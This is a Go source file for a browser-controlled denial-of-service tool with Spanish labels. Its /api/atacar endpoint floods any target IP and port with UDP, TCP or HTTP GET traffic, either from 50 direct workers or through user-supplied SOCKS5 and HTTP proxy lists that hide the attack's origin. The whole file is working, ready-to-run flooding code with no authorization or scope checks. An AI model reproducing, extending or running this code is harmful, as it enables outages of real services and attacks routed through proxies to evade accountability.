package main

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
)

var (
	stopChan      chan struct{}
	mutex         sync.Mutex
	clients       = make(map[*websocket.Conn]bool)
	broadcast     = make(chan string, 1000)
	upgrader      = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
	totalRequests uint64 // Contador atómico global de peticiones
)

func logMsg(format string, a ...interface{}) {
	msg := fmt.Sprintf(format, a...)
	fmt.Println(msg)
	select {
	case broadcast <- msg:
	default:
	}
}

func main() {
	if _, err := os.Stat("proxies.txt"); os.IsNotExist(err) {
		os.WriteFile("proxies.txt", []byte(""), 0644)
	}
	if _, err := os.Stat("proxies_http.txt"); os.IsNotExist(err) {
		os.WriteFile("proxies_http.txt", []byte(""), 0644)
	}

	fs := http.FileServer(http.Dir("./public"))
	http.Handle("/", fs)

	http.HandleFunc("/ws", handleConnections)
	http.HandleFunc("/api/proxies", handleProxies)
	http.HandleFunc("/api/proxies/stats", handleProxiesStats)
	http.HandleFunc("/api/atacar", handleAtacar)
	http.HandleFunc("/api/parar", handleParar)

	go handleMessages()

	port := ":3000"
	logMsg("[+] Servidor Masivo Go activo en http://localhost%s", port)
	if err := http.ListenAndServe(port, nil); err != nil {
		logMsg("[-] Error crítico: %v", err)
	}
}

func handleConnections(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	mutex.Lock()
	clients[ws] = true
	mutex.Unlock()
}

func handleMessages() {
	for {
		msg := <-broadcast
		mutex.Lock()
		for client := range clients {
			err := client.WriteMessage(websocket.TextMessage, []byte(msg))
			if err != nil {
				client.Close()
				delete(clients, client)
			}
		}
		mutex.Unlock()
	}
}

func contarLineasValidas(archivo string) int {
	data, err := os.ReadFile(archivo)
	if err != nil {
		return 0
	}
	lines := strings.Split(string(data), "\n")
	count := 0
	for _, l := range lines {
		if strings.TrimSpace(l) != "" {
			count++
		}
	}
	return count
}

func handleProxiesStats(w http.ResponseWriter, r *http.Request) {
	socksCount := contarLineasValidas("proxies.txt")
	httpCount := contarLineasValidas("proxies_http.txt")

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]int{
		"socks5": socksCount,
		"http":   httpCount,
		"total":  socksCount + httpCount,
	})
}

func handleProxies(w http.ResponseWriter, r *http.Request) {
	tipo := r.URL.Query().Get("tipo")
	archivo := "proxies.txt"
	if tipo == "http" {
		archivo = "proxies_http.txt"
	}

	if r.Method == http.MethodGet {
		data, _ := os.ReadFile(archivo)
		w.Write(data)
	} else if r.Method == http.MethodPost {
		var body struct {
			Tipo      string `json:"tipo"`
			Contenido string `json:"contenido"`
		}
		json.NewDecoder(r.Body).Decode(&body)
		targetFile := "proxies.txt"
		if body.Tipo == "http" {
			targetFile = "proxies_http.txt"
		}
		os.WriteFile(targetFile, []byte(body.Contenido), 0644)
		logMsg("[+] Lista %s actualizada con éxito.", targetFile)
	}
}

type AttackRequest struct {
	IP        string `json:"ip"`
	Puerto    string `json:"puerto"`
	Tamano    int    `json:"tamano"`
	Delay     int    `json:"delay"`
	Protocolo string `json:"protocolo"`
	Modo      string `json:"modo"`
}

func handleAtacar(w http.ResponseWriter, r *http.Request) {
	var req AttackRequest
	json.NewDecoder(r.Body).Decode(&req)

	if req.IP == "" {
		logMsg("[-] Error: Falta la IP o el dominio de destino.")
		return
	}

	if req.Tamano <= 0 {
		req.Tamano = 512
	}
	if req.Delay < 0 {
		req.Delay = 0
	}

	atomic.StoreUint64(&totalRequests, 0)
	detenerAtaque()

	mutex.Lock()
	stopChan = make(chan struct{})
	mutex.Unlock()

	logMsg("[+] ¡LANZAMIENTO! -> Destino: %s:%s | Tam: %d bytes | Delay: %d ms | Proto: %s | Modo: %s", req.IP, req.Puerto, req.Tamano, req.Delay, req.Protocolo, req.Modo)

	if req.Modo == "proxies" {
		go iniciarAtaqueMasivoProxies(req.IP, req.Puerto, req.Tamano, req.Delay, "socks5", req.Protocolo)
		go iniciarAtaqueMasivoProxies(req.IP, req.Puerto, req.Tamano, req.Delay, "http", req.Protocolo)
	} else {
		go iniciarAtaqueMasivoDirecto(req.IP, req.Puerto, req.Tamano, req.Delay, req.Protocolo)
	}
}

func handleParar(w http.ResponseWriter, r *http.Request) {
	detenerAtaque()
	logMsg("[!] Operación detenida por el usuario. Total peticiones: %d", atomic.LoadUint64(&totalRequests))
}

func detenerAtaque() {
	mutex.Lock()
	if stopChan != nil {
		close(stopChan)
		stopChan = nil
	}
	mutex.Unlock()
}

func generarPayload(ip string, tamano int, protocolo string) []byte {
	var base string
	if protocolo == "HTTP_Flood" {
		base = fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", ip)
	} else {
		base = fmt.Sprintf("X-Stress-Payload: %s\r\n", strings.Repeat("A", 10))
	}

	if len(base) < tamano {
		padding := strings.Repeat("X", tamano-len(base))
		base += padding
	} else if len(base) > tamano {
		base = base[:tamano]
	}
	return []byte(base)
}

func iniciarAtaqueMasivoDirecto(ip, puerto string, tamano int, delay int, protocolo string) {
	if puerto == "" {
		puerto = "80"
	}
	addr := fmt.Sprintf("%s:%s", ip, puerto)
	payload := generarPayload(ip, tamano, protocolo)

	for w := 0; w < 50; w++ {
		go func(workerID int) {
			for {
				select {
				case <-stopChan:
					return
				default:
					if protocolo == "UDP_Flood" {
						conn, err := net.Dial("udp", addr)
						if err == nil {
							conn.Write(payload)
							conn.Close()
							count := atomic.AddUint64(&totalRequests, 1)
							if count%10 == 0 { // Log cada 10 para no saturar
								logMsg("[DIRECTO W-%d] Enviado paquete UDP a %s", workerID, addr)
							}
						}
					} else {
						conn, err := net.DialTimeout("tcp", addr, 1500*time.Millisecond)
						if err == nil {
							conn.Write(payload)
							conn.Close()
							count := atomic.AddUint64(&totalRequests, 1)
							if count%10 == 0 {
								logMsg("[DIRECTO W-%d] Enviado paquete TCP a %s", workerID, addr)
							}
						}
					}

					if delay > 0 {
						time.Sleep(time.Duration(delay) * time.Millisecond)
					}
				}
			}
		}(w)
	}
}

func iniciarAtaqueMasivoProxies(ip, puerto string, tamano int, delay int, tipoProxy string, protocolo string) {
	if puerto == "" {
		puerto = "80"
	}
	archivo := "proxies.txt"
	if tipoProxy == "http" {
		archivo = "proxies_http.txt"
	}

	data, err := os.ReadFile(archivo)
	if err != nil || len(data) == 0 {
		return
	}

	proxies := strings.Split(string(data), "\n")
	var validos []string
	for _, p := range proxies {
		p = strings.TrimSpace(p)
		if p != "" {
			validos = append(validos, p)
		}
	}

	if len(validos) == 0 {
		return
	}

	logMsg("[+] Oleada activada con %d proxies [%s]", len(validos), strings.ToUpper(tipoProxy))
	payload := generarPayload(ip, tamano, protocolo)

	for _, proxyAddr := range validos {
		go func(pProxy string, tProxy string) {
			for {
				select {
				case <-stopChan:
					return
				default:
					pConn, err := net.DialTimeout("tcp", pProxy, 2*time.Second)
					if err != nil {
						time.Sleep(2 * time.Second)
						continue
					}

					if tProxy == "socks5" {
						pConn.Write([]byte{0x05, 0x01, 0x00})
						buf := make([]byte, 2)
						pConn.Read(buf)

						ipObj := net.ParseIP(ip)
						if ipObj != nil {
							req := []byte{0x05, 0x01, 0x00, 0x01}
							req = append(req, ipObj.To4()...)
							pInt := int(parsePort(puerto))
							req = append(req, byte(pInt>>8), byte(pInt&0xFF))
							pConn.Write(req)

							resp := make([]byte, 10)
							pConn.Read(resp)
						}
					}

					pConn.Write(payload)
					pConn.SetDeadline(time.Now().Add(2 * time.Second))
					bufData := make([]byte, 256)
					pConn.Read(bufData)

					pConn.Close()

					// ¡LOG DE CADA PROXY EN TIEMPO REAL!
					atomic.AddUint64(&totalRequests, 1)
					logMsg("[%s PROXY] %s -> Impactó en %s:%s", strings.ToUpper(tProxy), pProxy, ip, puerto)

					if delay > 0 {
						time.Sleep(time.Duration(delay) * time.Millisecond)
					}
				}
			}
		}(proxyAddr, tipoProxy)
	}
}

func parsePort(pStr string) uint16 {
	var p int
	fmt.Sscanf(pStr, "%d", &p)
	return uint16(p)
}
